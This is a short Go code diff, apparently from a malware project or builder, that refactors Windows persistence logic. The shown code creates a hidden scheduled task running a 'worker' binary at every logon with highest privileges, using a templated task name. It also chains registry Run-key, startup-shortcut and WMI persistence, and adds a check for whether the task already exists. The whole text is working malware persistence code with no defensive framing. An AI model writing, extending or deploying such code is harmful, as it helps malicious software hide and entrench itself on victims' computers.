@@ -154,7 +154,7 @@ func cmdHidden(name string, args ...string) *exec.Cmd {
 }
 
 func opSetupTask(workerPath string) {
-	taskName := "%s"
+	taskName := getTaskName()
 	tr := "\"" + workerPath + "\" worker"
 	cmd := cmdHidden(getSchtasksExeName(), "/Create", "/TN", taskName, "/TR", tr, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F")
 	if err := cmd.Run(); err != nil {
@@ -164,6 +164,15 @@ func opSetupTask(workerPath string) {
 	opAddRegistryRun(workerPath)
 	opAddStartupShortcut(workerPath)
 	opAddWmiPersistence(workerPath)
+}
+
+func getTaskName() string {
+	return "%s"
+}
+
+func isTaskPresent(taskName string) bool {
+	cmd := cmdHidden(getSchtasksExeName(), "/Query", "/TN", taskName)
+	return cmd.Run() == nil
 }
 
 func opAddRegistryRun(workerPath string) {
